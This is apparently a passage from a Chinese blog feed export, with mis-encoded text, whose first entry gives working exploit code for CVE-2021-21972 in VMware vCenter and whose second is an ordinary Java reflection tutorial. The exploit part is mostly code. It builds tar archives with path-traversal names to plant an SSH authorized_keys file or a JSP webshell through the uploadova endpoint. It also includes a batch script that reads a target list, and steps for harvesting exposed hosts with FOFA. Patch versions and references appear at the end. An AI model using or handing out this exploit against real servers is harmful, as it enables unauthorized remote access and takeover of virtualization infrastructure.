import os from io import BytesIO import requests proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", } def return_zip(): with tarfile.open("test.tar", 'w') as tar: payload = BytesIO() id_rsa_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwgGuwNdSGHKvzHsHt7QImwwJ08Wa/+gHXOt+VwZTD23rLwCGVeYmfKObDY0uFfe2O4jr+sPamgA8As4LwdqtkadBPR+EzZB+PlS66RcVnUnDU4UdMhQjhyj/uv3pdtugugJpB9xaLdrUWwGoOLYA/djxD5hmojGdoYydBezsNhj2xXRyaoq3AZVqh1YLlhpwKnzhodk12a7/7EU+6Zj/ee5jktEwkBsVsDLTTWPpSnzK7r+kAHkbYx8fvO3Fk+9jlwadgbmhHJrpPr8gLEhwvrEnPcK1/j+QXvVkgy2cuYxl9GCUPv2wgZCN50f3wQlaJiektm2S9WkN5dLDdX+X4w==' # é’ˆå¯¹Linuxæœ‰æ•ˆçš„æ–¹å¼ tarinfo = tarfile.TarInfo(name='../../../home/vsphere-ui/.ssh/authorized_keys') # Windows éœ€è¦æ”¹ä¸€ä¸‹ #tarinfo = tarfile.TarInfo(name="..\\..\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\test.jsp") f1 = BytesIO(id_rsa_pub.encode()) tarinfo.size = len(f1.read()) f1.seek(0) tar.addfile(tarinfo, fileobj=f1) tar.close() payload.seek(0) def getshell(url): files = {'uploadFile':open('test.tar','rb')} try: r = requests.post(url=url, files=files,proxies=proxies,verify = False).text print(r) # windowsä¸‹ï¼š # print('shellåœ°å€:/statsreport/test.jsp') except: print('flase') if __name__ == "__main__": try: return_zip() url="https://192.168.1.1/ui/vropspluginui/rest/services/uploadova" getshell(url) except IOError as e: raise e æ•´åˆçš„POC&amp;EXP import requests import tarfile import sys import getopt requests.packages.urllib3.disable_warnings() proxy = {} def poc(target): url = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui') web = requests.get(url,verify=False,proxies=proxy) if web.status_code == 405: return True else: return False def payload_linux(filename, payload_type): payload_path = '../../home/vsphere-ui/.ssh/authorized_keys' if payload_type=='ssh' else '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/test.jsp' payload_tar = tarfile.open('payload_linux.tar','w') for i in range(106): payload_tar.add(filename, arcname=payload_path % i) payload_tar.close() def payload_win(filename): payload_path = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/test.jsp' payload_tar = tarfile.open('payload_win.tar','w') payload_tar.add(filename, arcname=payload_path) payload_tar.close() def send_payload(target, payload_type): url = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui') files = {'uploadFile': ('1.tar', open('payload_linux.tar', 'rb'), 'application/octet-stream')} web = requests.post(url, files=files,verify=False,proxies=proxy) if web.status_code == 200: if web.text == 'SUCCESS': if payload_type == 'ssh': print('\tæ–‡ä»¶å†™å…¥æˆåŠŸ') if payload_type != 'ssh': webshell = (target + '/ui/resources/test.jsp').replace('//ui', '/ui') web = requests.get(webshell,verify=False,proxies=proxy) if web.status_code != 404: print('\twebshellåœ°å€ï¼š%s' % webshell) return True files = {'uploadFile': ('1.tar', open('payload_win.tar', 'rb'), 'application/octet-stream')} web = requests.post(url, files=files,verify=False,proxies=proxy) if web.status_code == 200: if web.text == 'SUCCESS': print('\tæ–‡ä»¶å†™å…¥æˆåŠŸ') webshell = (target + '/statsreport/test.jsp').replace('//statsreport', '/statsreport') web = requests.get(webshell,verify=False,proxies=proxy) if web.status_code != 404: print('\twebshellåœ°å€ï¼š%s' % webshell) with open("webshellåœ°å€.txt", "a+") as fff: fff.write('webshellåœ°å€ï¼š%s \n' % webshell) return True return False def help(): print( """ Usage:CVE-2021-21972.py [option] -u or --urlï¼šç›®æ ‡url -t or --typeï¼šæ”»å‡»æ–¹å¼ï¼ˆssh/webshell) -f or --fileï¼šè¦ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆwebshellæˆ–authorized_keysï¼‰ ä¾‹å¦‚ï¼šCVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p or --proxyï¼šè®¾ç½®ä»£ç† ä¾‹å¦‚ï¼šCVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p http://127.0.0.1:8080 -l or --listï¼šæ‰¹é‡æ£€æµ‹ ä¾‹å¦‚ï¼šCVE-2021-21972.py -l list.txt -t webshell -f shell.jsp """ ) if __name__ == "__main__": if len(sys.argv) == 1: help() sys.exit() try: opts, args = getopt.getopt(sys.argv[1:], "l:u:t:f:p:") except getopt.GetoptError: print("argv error,please input") targets = [] payload_type = '' filename = '' for opt, arg in opts: if opt in ('-p', '--proxy'): proxy = {arg[:arg.find(':')]: arg} for opt, arg in opts: if opt in ('-l', '--list'): with open(arg, 'r') as t: for u in t.read().split('\n'): targets.append(u) elif opt in ('-u', '--url'): targets.append(arg) for opt, arg in opts: if opt in ('-t', '--type'): payload_type = arg for opt, arg in opts: if opt in ('-f', '--file'): filename = arg payload_linux(filename, payload_type) if payload_type != 'ssh': payload_win(filename) for target in targets: print('-' * 50) print('æ­£åœ¨æ£€æµ‹%s...' % target) if poc(target): if send_payload(target, payload_type): continue print('Failed') æ¼æ´å¤ç°1.fofaæœç´¢title="+ ID_VC_Welcome +" å¯ä»¥ç”¨æ‰¹é‡è„šæœ¬é€šè¿‡fofaæŠŠæ‰€æœ‰æœç´¢åˆ°çš„èµ„äº§ä¸‹è½½åˆ°æœ¬åœ° 2.ç„¶åä½¿ç”¨POCéªŒè¯æ¼æ´ï¼š 3.1 æ·»åŠ ä¸€ä¸ªvsphere-uiç”¨æˆ·ï¼š adduser vsphere-ui 3.2 ç”Ÿæˆ sshå¯†é’¥ ssh-keygen -t rsa # ç„¶åå¤åˆ¶å…¬é’¥åˆ°ä¸Šé¢çš„EXPä¸­å» 3.å¯¹äºå­˜åœ¨æ¼æ´çš„èµ„äº§ï¼Œä½¿ç”¨EXPä¸Šä¼ taræ–‡ä»¶ æˆåŠŸä¸Šä¼ authorized_keys 4.sshè¿æ¥ ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ jspå°é©¬ç­‰æ–¹å¼è¿›è¡Œåˆ©ç”¨ æ¼æ´ä¿®å¤ vCenter Server7.0ç‰ˆæœ¬å‡çº§åˆ°7.0.U1c vCenter Server6.7ç‰ˆæœ¬å‡çº§åˆ°6.7.U3l vCenter Server6.5ç‰ˆæœ¬å‡çº§åˆ°6.5 U3n å‚è€ƒhttps://www.vmware.com/security/advisories/VMSA-2021-0002.html https://www.cnblogs.com/cHr1s/p/14445759.html http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>CVE-2021-21972</tag>
        <tag>vCenter 6.5-7.0 RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹åå°„åˆæ¢]]></title>
    <url>%2Fposts%2F33171%2F</url>
    <content type="text"><![CDATA[Javaåå°„æœºåˆ¶æ¦‚è¿° Reflectionï¼ˆåå°„ï¼‰æ˜¯è¢«è§†ä¸ºåŠ¨æ€è¯­è¨€çš„å…³é”®ï¼Œåå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨æ‰§è¡ŒæœŸå€ŸåŠ©äºReflection APIå–å¾—ä»»ä½•ç±»çš„å†…éƒ¨ä¿¡æ¯ï¼Œå¹¶èƒ½ç›´æ¥æ“ä½œä»»æ„å¯¹è±¡çš„å†…éƒ¨å±æ€§åŠæ–¹æ³•ã€‚ åŠ è½½å®Œç±»ä¹‹åï¼Œåœ¨å †å†…å­˜çš„æ–¹æ³•åŒºä¸­å°±äº§ç”Ÿäº†ä¸€ä¸ªClassç±»å‹çš„å¯¹è±¡ï¼ˆä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡å°±åŒ…å«äº†å®Œæ•´çš„ç±»çš„ç»“æ„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡çœ‹åˆ°ç±»çš„ç»“æ„ã€‚è¿™ä¸ªå¯¹è±¡å°±åƒä¸€é¢é•œå­ï¼Œé€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å½¢è±¡çš„ç§°ä¹‹ä¸º: åå°„ã€‚ æœ‰äº†åå°„ï¼Œå°±æœ‰äº†JavaåŠ¨æ€çš„ç‰¹æ€§ Javaåå°„æœºåˆ¶æä¾›çš„åŠŸèƒ½ï¼š åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±» åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³• åœ¨è¿è¡Œæ—¶è·å–æ³›å‹ä¿¡æ¯ åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡å’Œæ–¹æ³• åœ¨è¿è¡Œæ—¶å¤„ç†æ³¨è§£ ç”ŸæˆåŠ¨æ€ä»£ç† åå°„ç›¸å…³çš„ä¸»è¦APIï¼› java.lang.Class:ä»£è¡¨ä¸€ä¸ªç±» java.lang.reflect.Method:ä»£è¡¨ç±»çš„æ–¹æ³• java.lang.reflect.Field:ä»£è¡¨ç±»çš„æˆå‘˜å˜é‡ java.lang.reflect.Constructor:ä»£è¡¨ç±»çš„æ„é€ å™¨ â€¦â€¦ åå°„ä»£ç ï¼š package cn.xpshuai.java1; import org.junit.Test; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-04 22:38 * @åŠŸèƒ½ï¼š * * æ€»ç»“ï¼šå…¬å¼€çš„ä»£ç éƒ½ä¸å®‰å…¨ * *ç–‘é—®ï¼š é€šè¿‡ç›´æ¥newå¯¹è±¡çš„æ–¹å¼æˆ–åå°„çš„æ–¹å¼éƒ½å¯ç–‘è°ƒç”¨å…¬å…±çš„ç»“æ„ï¼Œå¼€å‘ä¸­åˆ°åº•ç”¨å“ªä¸ªï¼Ÿ * å»ºè®®ç”¨newçš„æ–¹æ³• * ä»€ä¹ˆæ—¶å€™ä¼šä½¿ç”¨åå°„çš„æ–¹å¼ã€‚åå°„çš„ç‰¹å¾:åŠ¨æ€æ€§ * * ç–‘é—®ï¼šåå°„æœºåˆ¶ä¸é¢å‘å¯¹è±¡ä¸­çš„å°è£…æ€§æ˜¯ä¸æ˜¯çŸ›ç›¾çš„å‘¢ï¼Ÿ *ä¸çŸ›ç›¾ï¼Œå°è£…æ€§æ˜¯å»ºè®®ä½ è°ƒä¸è°ƒï¼›åå°„è§£å†³çš„æ˜¯èƒ½ä¸èƒ½è°ƒ * * */ public class ReflectionTest { //åå°„ä¹‹å‰ï¼Œå¯¹äºPersonç±»çš„æ“ä½œ @Test public void test(){ //1.å®ä¾‹åŒ–ç±»å¯¹è±¡ Person p1 = new Person("tom", 12); //2.å¯ä»¥é€šè¿‡å¯¹è±¡ï¼Œè°ƒç”¨å†…éƒ¨å±æ€§ã€æ–¹æ³• p1.age = 10; System.out.println(p1); p1.setAge(11); System.out.println(p1); p1.show(); //åœ¨ Personç±»å¤–éƒ¨ï¼Œä¸å¯ä»¥é€šè¿‡Personç±»çš„å¯¹è±¡è°ƒç”¨å…¶å†…éƒ¨ç§æœ‰ç»“æ„(æ¯”å¦‚ç§æœ‰å±æ€§ã€ç§æœ‰æ–¹æ³•ã€ç§æœ‰æ„é€ å™¨ç­‰)ã€‚ } /* åå°„ä¹‹åï¼Œå¯¹äºPersonçš„æ“ä½œ */ @Test public void test1() throws Exception { Class clazz = Person.class; //1.é€šè¿‡åå°„åˆ›å»ºäº†Personç±»çš„å¯¹è±¡ Constructor cons = clazz.getConstructor(String.class, int.class); Object obj = cons.newInstance("Tom", 12); //é€ äº†ä¸ªå¯¹è±¡, å¤šæ€çš„å½¢å¼ Person p = (Person)obj; //çŸ¥é“ç±»å‹çš„è¯å¯ä»¥å¼ºè½¬ System.out.println(p.toString()); // //2.é€šè¿‡åå°„ï¼Œè°ƒç”¨å¯¹è±¡æŒ‡å®šçš„å±æ€§ã€æ–¹æ³• //è°ƒå±æ€§ Field age = clazz.getDeclaredField("age"); age.set(p, 18); System.out.println(p.toString()); //è°ƒç”¨æ–¹æ³• Method show = clazz.getDeclaredMethod("show"); show.invoke(p); //è°ƒç”¨ System.out.println("*******************"); //é€šè¿‡åå°„ï¼Œå¯ä»¥è°ƒç”¨Personç±»(è¿è¡Œæ—¶ç±»)çš„ç§æœ‰ç»“æ„ï¼ˆç§æœ‰æ–¹æ³•ã€ç§æœ‰å±æ€§ã€ç§æœ‰æ„é€ å™¨ï¼‰ //è°ƒç”¨ç§æœ‰æ„é€ å™¨ Constructor cons1 = clazz.getDeclaredConstructor(String.class); cons1.setAccessible(true); Person p1 = (Person) cons1.newInstance("Jerry"); System.out.println(p1); //è°ƒç”¨ç§æœ‰å±æ€§ Field name = clazz.getDeclaredField("name"); name.setAccessible(true); name.set(p1, "hanmeimei"); System.out.println(p1); //è°ƒç”¨ç§æœ‰æ–¹æ³• Method na = clazz.getDeclaredMethod("showNation", String.class); //æ–¹æ³•åï¼Œå’±å” na.setAccessible(true); // na.invoke(p1, "China"); //è°ƒç”¨ String nation = (String) na.invoke(p1, "China"); //æ¥æ”¶è¿”å›å€¼ã€‚è°ƒç”¨, ç›¸å½“äºp1.show("China") System.out.println(nation); } @Test public void test2(){ } @Test public void test3(){ } } package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-04 22:38 * @åŠŸèƒ½ï¼š */ public class Person { private String name; public int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } private Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void show(){ System.out.println("showæ–¹æ³•"); } private String showNation(String nation){ System.out.println("æˆ‘çš„å›½ç±æ˜¯ï¼š" + nation); return nation; } @Override public String toString() { return "Person{" + "name='" + name + '\'' + ", age=" + age + '}'; } } ç†è§£Classç±»å¹¶è·å–Classå®ä¾‹å¯¹Classç±»çš„ç†è§£ * å…³äºjava.lang.Classçš„ç†è§£ï¼š * Class clazz = Person.class; -->åå°„çš„æºå¤´ * 1.ç±»çš„åŠ è½½è¿‡ç¨‹ * ç¨‹åºç»è¿‡javac.exeå‘½ä»¤ä»¥åï¼Œä¼šç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚ç æ–‡ä»¶(.classç»“å°¾)ï¼Œ * æ¥ç€æˆ‘ä»¬ä½¿ç”¨java.exeå‘½ä»¤å¯¹æŸä¸ªå­—èŠ‚ç æ–‡ä»¶è¿›è¡Œè§£é‡Šè¿è¡Œã€‚ç›¸å½“äºå°†æŸä¸ªå­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ­¤è¿‡ç¨‹å°±æˆä¸ºç±»çš„åŠ è½½ã€‚ * åŠ è½½åˆ°å†…å­˜ä¸­çš„ç±»ï¼Œæˆ‘ä»¬å°±ç§°ä¸ºè¿è¡Œæ—¶ç±»ï¼Œæ­¤è¿è¡Œæ—¶ç±»ï¼Œå°±ä½œä¸ºClassçš„ä¸€ä¸ªå®ä¾‹ * ï¼ˆç±»æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ˜¯Classçš„å¯¹è±¡ ï¼‰ * æ¢å¥è¯è¯´ï¼ŒClassçš„å®ä¾‹å°±å¯¹åº”ç€ä¸€ä¸ªè¿è¡Œæ—¶ç±» * åŠ è½½æ­é…å†…å­˜ä¸­çš„è¿è¡Œæ—¶ç±»ï¼Œä¼šç¼“å­˜ä¸€å®šçš„æ—¶é—´ï¼Œåœ¨æ­¤æ—¶é—´ä¹‹å†…ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼ æ¥è·å–æ­¤è¿è¡Œæ—¶ç±» * * * * * --- ä¸‡äº‹ä¸‡ç‰©çš†å¯¹è±¡ï¼šå¯¹è±¡.xxx, File, URK, åå°„, å‰ç«¯, æ•°æ®åº“æ“ä½œ è·å–Classå®ä¾‹çš„4ç§æ–¹å¼ /* * å…³äºjava.lang.Classçš„ç†è§£ï¼š * Class clazz = Person.class; -->åå°„çš„æºå¤´ * 1.ç±»çš„åŠ è½½è¿‡ç¨‹ * ç¨‹åºç»è¿‡javac.exeå‘½ä»¤ä»¥åï¼Œä¼šç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚ç æ–‡ä»¶(.classç»“å°¾)ï¼Œ * æ¥ç€æˆ‘ä»¬ä½¿ç”¨java.exeå‘½ä»¤å¯¹æŸä¸ªå­—èŠ‚ç æ–‡ä»¶è¿›è¡Œè§£é‡Šè¿è¡Œã€‚ç›¸å½“äºå°†æŸä¸ªå­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ­¤è¿‡ç¨‹å°±æˆä¸ºç±»çš„åŠ è½½ã€‚ * åŠ è½½åˆ°å†…å­˜ä¸­çš„ç±»ï¼Œæˆ‘ä»¬å°±ç§°ä¸ºè¿è¡Œæ—¶ç±»ï¼Œæ­¤è¿è¡Œæ—¶ç±»ï¼Œå°±ä½œä¸ºClassçš„ä¸€ä¸ªå®ä¾‹ * ï¼ˆç±»æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ˜¯Classçš„å¯¹è±¡ ï¼‰ * æ¢å¥è¯è¯´ï¼ŒClassçš„å®ä¾‹å°±å¯¹åº”ç€ä¸€ä¸ªè¿è¡Œæ—¶ç±» * åŠ è½½æ­é…å†…å­˜ä¸­çš„è¿è¡Œæ—¶ç±»ï¼Œä¼šç¼“å­˜ä¸€å®šçš„æ—¶é—´ï¼Œåœ¨æ­¤æ—¶é—´ä¹‹å†…ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼ * æ¥è·å–æ­¤è¿è¡Œæ—¶ç±» * * --- ä¸‡äº‹ä¸‡ç‰©çš†å¯¹è±¡ï¼šå¯¹è±¡.xxx, File, URK, åå°„, å‰ç«¯, æ•°æ®åº“æ“ä½œ * * * è·å–Classå®ä¾‹çš„4ç§æ–¹å¼ï¼Œå¦‚ä¸‹ï¼ˆå‰ä¸‰ç§æ–¹å¼éœ€è¦æŒæ¡ï¼‰ */ @Test public void test2() throws ClassNotFoundException { //æ–¹å¼1ï¼šè°ƒç”¨è¿è¡Œæ—¶ç±»çš„å±æ€§: .class Class&lt;Person> clazz = Person.class; //åŠ ä¸Šæ³›å‹ System.out.println(clazz); //æ–¹å¼2ï¼šé€šè¿‡è¿è¡Œæ—¶ç±»çš„å¯¹è±¡.è°ƒç”¨getClass() Person p1 = new Person(); Class clazz2 = p1.getClass(); //æ–¹å¼3(ä½¿ç”¨æœ€å¤š)ï¼šè°ƒç”¨Classçš„é™æ€æ–¹æ³•: forName(String classPath) Class clazz3 = Class.forName("cn.xpshuai.java1.Person"); System.out.println(clazz == clazz2); // true //æ–¹å¼4(ä½¿ç”¨è¾ƒå°‘)ï¼šä½¿ç”¨ç±»çš„åŠ è½½å™¨ï¼šClassLoader ClassLoader classLoader = ReflectionTest.class.getClassLoader(); Class clazz4 = classLoader.loadClass("cn.xpshuai.java1.Person"); } å“ªäº›ç±»å‹å¯ä»¥æœ‰classå¯¹è±¡? class:å¤–éƒ¨ç±»ï¼Œæˆå‘˜(æˆå‘˜å†…éƒ¨ç±»ï¼Œé™æ€å†…éƒ¨ç±»)ï¼Œå±€éƒ¨å†…éƒ¨ç±»ï¼ŒåŒ¿åå†…éƒ¨ç±» interface: æ¥å£ []: æ•°ç»„ enum: æšä¸¾ annotation: æ³¨è§£@interface primitive type:åŸºæœ¬æ•°æ®ç±»å‹ void Classå®ä¾‹å¯ä»¥æ˜¯å“ªäº›ç»“æ„çš„è¯´æ˜ï¼š ç±»çš„åŠ è½½ä¸ClassLoaderçš„ç†è§£ç±»çš„åŠ è½½è¿‡ç¨‹ï¼š ä¾‹å­ï¼š ç±»çš„åŠ è½½å™¨ï¼š ä½¿ç”¨ClassLoaderè¯»å–é…ç½®æ–‡ä»¶ /* Properties: ç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ã€‚ */ @Test public void test4() throws IOException { Properties pros = new Properties(); //æ­¤æ—¶çš„æ–‡ä»¶é»˜è®¤åœ¨å½“å‰çš„moduleä¸‹ //è¯»å–é…ç½®æ–‡ä»¶çš„æ–¹å¼1ï¼š // FileInputStream fis = new FileInputStream("jdbc.properties"); // FileInputStream fis = new FileInputStream("src\\dbc.properties"); // pros.load(fis); //åŠ è½½è¾“å…¥æµ //è¯»å–é…ç½®æ–‡ä»¶çš„æ–¹å¼2ï¼ˆå¸¸ç”¨ï¼‰ï¼š //æ­¤æ—¶çš„æ–‡ä»¶é»˜è®¤åœ¨å‰çš„moduleä¸‹çš„srcç›®å½•ä¸‹ ClassLoader classLoader = ClassLoaderTest.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream("jdbc.properties"); pros.load(is); String user = pros.getProperty("user"); String pass = pros.getProperty("pass"); System.out.println(user + pass); } åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ï¼ˆé‡ç‚¹ï¼‰é€šè¿‡åå°„ï¼Œåˆ›å»ºå¯¹åº”çš„è¿è¡Œæ—¶ç±»çš„å¯¹è±¡: @Test public void test() throws IllegalAccessException, InstantiationException, ClassNotFoundException { Class clazz = Class.forName("cn.xpshuai.java1.Person"); // newInstance(): åˆ›å»ºå¯¹åº”çš„è¿è¡Œæ—¶ç±»çš„å¯¹è±¡, å†…éƒ¨è°ƒç”¨äº†è¿è¡Œæ—¶ç±»çš„ç©ºå‚æ„é€ å™¨ //è¦æƒ³æ­¤æ–¹æ³•æ­£å¸¸çš„åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ï¼Œè¦æ±‚ï¼š //1.è¿è¡Œæ—¶ç±»å¿…é¡»æä¾›ç©ºå‚çš„æ„é€ å™¨ //2.ç©ºå‚çš„æ„é€ å™¨çš„è®¿é—®æƒé™å¾—å¤Ÿï¼Œé€šå¸¸è®¾ç½®ä¸ºpublic //åœ¨javabeanä¸­è¦æ±‚æä¾›ä¸€ä¸ªpublicçš„ç©ºå‚æ„é€ å™¨ï¼ŒåŸå› ï¼š //1.ä¾¿äºé€šè¿‡åå°„ï¼Œåˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ //2.ä¾¿äºå­ç±»ç»§æ‰¿æ­¤è¿è¡Œæ—¶ç±»æ—¶ï¼Œé»˜è®¤è°ƒç”¨super()æ—¶ï¼Œä¿è¯çˆ¶ç±»æœ‰æ­¤æ„é€ å™¨ Object obj = clazz.newInstance(); System.out.println(obj); } ä¸¾ä¾‹ä½“ä¼šåå°„çš„åŠ¨æ€æ€§ï¼š //ä½“ä¼šåå°„çš„åŠ¨æ€æ€§ @Test public void test1() throws IllegalAccessException, InstantiationException, ClassNotFoundException { int num = new Random().nextInt(3); // 0,1,2 String classPath = ""; switch (num){ case 0: classPath = "java.util.Date"; break; case 1: classPath = "java.lang.Object"; break; case 2: classPath = "cn.xpshuai.java1.Person"; break; } Object obj = getInstance(classPath); System.out.println(obj); } //æ­¤æ–¹æ³•åˆ›å»ºä¸€ä¸ªæŒ‡å®šç±»çš„å¯¹è±¡ï¼ŒclassPath: æŒ‡å®šç±»çš„å…¨ç±»å public Object getInstance(String classPath) throws ClassNotFoundException, IllegalAccessException, InstantiationException { Class clazz = Class.forName(classPath); return clazz.newInstance(); } è·å–è¿è¡Œæ—¶ç±»çš„å®Œæ•´ç»“æ„(äº†è§£å³å¯)å…ˆåˆ›å»ºä¸€ä¸‹ä¸°å¯Œçš„Personç±»çš„ç»“æ„(java2åŒ…é‡Œé¢)ï¼š Person.java package cn.xpshuai.java2; import java.io.IOException; /** æä¾›ç»“æ„æ›´ä¸°å¯Œçš„Personç±» */ @MyAnnotation(value = "Hi") public class Person extends Creature&lt;String> implements Comparable&lt;String>,MyInterface{ private String name; int age; public int id; @MyAnnotation(value = "abc") public Person() { System.out.println("Personçš„ç©ºå‚æ„é€ å™¨"); } private Person(String name) { this.name = name; } Person(String name, int age) { this.name = name; this.age = age; } public String display(String interests, int age) throws IOException { return interests + age; } @MyAnnotation private void show(String nation){ System.out.println("showæ–¹æ³•,æˆ‘çš„å›½ç±æ˜¯ï¼š" + nation); } @Override public String toString() { return "Person{" + "name='" + name + '\'' + ", age=" + age + '}'; } @Override public void info() { System.out.println("infoæ–¹æ³•ï¼Œæˆ‘æ˜¯ä¸€ä¸ªäºº"); } @Override public int compareTo(String o) { return 0; } } Creature.java package cn.xpshuai.java2; import java.io.Serializable; public class Creature&lt;T> implements Serializable { private char gender; public double weight; public void breath(){ System.out.println("ç”Ÿç‰©å‘¼å¸"); } public void eat(){ System.out.println("ç”Ÿç‰©åƒä¸œè¥¿"); } } MyInterface.java package cn.xpshuai.java2; public interface MyInterface { void info(); } MyAnnotation.java package cn.xpshuai.java2; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; import static java.lang.annotation.ElementType.*; @Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE}) @Retention(RetentionPolicy.RUNTIME) public @interface MyAnnotation { String value() default "hello"; } æµ‹è¯•ä»£ç (java3åŒ…é‡Œé¢)ï¼š package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.reflect.Field; import java.lang.reflect.Modifier; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-05 15:28 * @åŠŸèƒ½ï¼šè·å–å½“å‰è¿è¡Œæ—¶ç±»çš„å±æ€§ç»“æ„ */ public class FieldTest { @Test public void test(){ Class clazz = Person.class; //è·å–å±æ€§ç»“æ„ //getFields(): è·å–å½“å‰è¿è¡Œæ—¶ç±»åŠå…¶çˆ¶ç±»ä¸­å£°æ˜ä¸ºpublicè®¿é—®æƒé™çš„å±æ€§ Field[] fields = clazz.getFields(); for(Field f: fields){ System.out.println(f); } //è·å–å£°æ˜çš„å±æ€§ç»“æ„ //getDeclaredFields(): è·å–å½“å‰è¿è¡Œæ—¶ç±»å½“ä¸­å£°æ˜çš„æ‰€æœ‰å±æ€§(ä¸æƒé™æ— å…³)ï¼Œä¸åŒ…å«çˆ¶ç±»ä¸­çš„å±æ€§ Field[] declaredFields = clazz.getDeclaredFields(); for(Field f: declaredFields){ System.out.println(f); } System.out.println("******************"); } //æƒé™ä¿®é¥°ç¬¦ æ•°æ®ç±»å‹ å˜é‡å = ... @Test public void test1(){ Class clazz = Person.class; Field[] declaredFields = clazz.getDeclaredFields(); for(Field f: declaredFields){ //1.æƒé™ä¿®é¥°ç¬¦ //è¿”å›çš„æ˜¯æ•°å­—(åœ¨Modifierç±»ä¸­æœ‰) int modifiers = f.getModifiers(); // System.out.println(modifiers); System.out.print(Modifier.toString(modifiers) + "\t"); //ç¿»è¯‘å›æ¥ //2.æ•°æ®ç±»å‹ Class&lt;?> types = f.getType(); System.out.print(types.getName() + "\t"); //3.å˜é‡å String fname = f.getName(); System.out.print(fname); System.out.println(); } } } package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Method; import java.lang.reflect.Modifier; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-05 15:43 * @åŠŸèƒ½ï¼šè·å–å½“å‰è¿è¡Œæ—¶ç±»çš„æ–¹æ³•ç»“æ„ æ¡†æ¶ = æ³¨è§£+åå°„+æ¶‰åŠæ¨¡å¼ */ public class MethodTest { @Test public void test(){ Class&lt;Person> clazz = Person.class; //è·å–æ–¹æ³•ç»“æ„ //getMethods():è·å–å½“å‰è¿è¡Œæ—¶ç±»åŠå…¶çˆ¶ç±»ä¸­å£°æ˜ä¸ºpublicè®¿é—®æƒé™çš„æ–¹æ³• Method[] methods = clazz.getMethods(); for(Method m: methods){ System.out.println(m); } //getDeclaredMethods():è·å–å½“å‰è¿è¡Œæ—¶ç±»å½“ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•(ä¸æƒé™æ— å…³)ï¼Œä¸åŒ…å«çˆ¶ç±»ä¸­çš„æ–¹æ³• Method[] dmethods = clazz.getDeclaredMethods(); for(Method m: dmethods){ System.out.println(m); } } /* è·å–è¿è¡Œæ—¶ç±»çš„å†…éƒ¨ç»“æ„ @Xxx æƒé™ä¿®é¥°ç¬¦ 